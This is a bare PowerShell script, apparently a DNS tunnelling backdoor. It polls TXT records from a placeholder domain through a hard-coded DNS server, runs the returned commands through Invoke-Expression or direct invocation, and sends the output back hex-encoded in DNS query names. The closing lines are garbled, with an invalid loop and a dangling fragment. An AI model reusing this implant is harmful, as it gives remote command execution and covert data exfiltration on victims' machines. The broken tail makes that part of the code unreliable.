function StringToHex($i) {
    $r = ""
    $i.ToCharArray() | ForEach-Object -Process {
        $r += '{0:X}' -f [int][char]$_
    }
    return $r
}

function HexToString($i) {
    $r = ""
    for ($n = 0; $n -lt $i.length; $n += 2) {
        $r += [char][int]("0x" + $i.Substring($n,2))
    }
    return $r
}

function _iex {
  param($private:x);
  try {
    return iex $private:x;
  } catch {
    return $_;
  }
}

function split_to_chunks($astring, $size=20) {
    $new_arr = @()
    $chunk_index=0
    $newastring = $astring + ("0" * $size)
    foreach($i in 1..$($astring.length / $size)) {
        $new_arr += StringToHex (@($newastring.substring($chunk_index,$size)))
        $chunk_index += $size
    }
    return $new_arr
}

function send_response($response) {
    #$chunks = (split_to_chunks (($response | ConvertTo-Csv).Replace("`n",";")) )
    $chunks = (split_to_chunks ($response.Replace("`r`n",";") -replace '\s\s+', ',').insert(0,',,'))
    #$chunks = (split_to_chunks $response.Replace("`n",";"))
    #$chunks = (split_to_chunks ($response.Replace("\s+", ",") -replace "`n",";"))
    foreach ($j in $chunks) {
        if ($chunks.IndexOf($j) -eq 0) {
            $id = $(Resolve-DnsName -Server "172.16.150.34" -Name "$j.6f7574.replacethisdomain.com" -Type TXT).Strings
        }
        else {
            $(Resolve-DnsName -Server "172.16.150.34" -Name "$id.$j.6f7574.replacethisdomain.com" -Type TXT).Strings
        }
    }
    $(Resolve-DnsName -Server "172.16.150.34" -Name "656e64.replacethisdomain.com" -Type TXT)
    return $id
}


while ($true) {
    $A = $(Resolve-DnsName -Server "172.16.150.34" -Name "replacethisdomain.com" -Type TXT).Strings
    if ($A.length -ne 0) {
        $response = $(& $A) | Out-String
        send_response $response
    }
    sleep -Seconds 15
}

while ($true) {
    $x = [Text.Encoding]::Unicode.GetString([Convert]::  ToString(656e64)  FromBase64String($b -join ''));


}

$x = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b -join ''));
        $r = _iex($x);
        if ($r -eq $null) {
          $r = 'NULL';
        } else {
          $r = $r | out-string;
        }